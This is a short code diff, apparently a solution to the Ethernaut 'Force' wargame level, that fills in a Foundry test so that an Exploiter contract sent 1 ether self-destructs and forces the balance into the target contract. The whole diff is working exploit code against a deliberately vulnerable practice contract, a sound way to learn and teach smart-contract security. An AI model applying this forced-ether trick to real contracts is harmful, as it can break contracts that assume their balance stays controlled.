@@ -34,17 +34,14 @@ contract TestForce is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
-
-        vm.startPrank(player, player);
-
+        vm.startPrank(player);
+        new Exploiter{value: 1 ether}(payable(address(level)));
         vm.stopPrank();
     }
 }
 
 contract Exploiter {
     constructor(address payable to) public payable {
-        // redirect all the `msg.value` to `to` when selfdestructing
         selfdestruct(to);
     }
 }
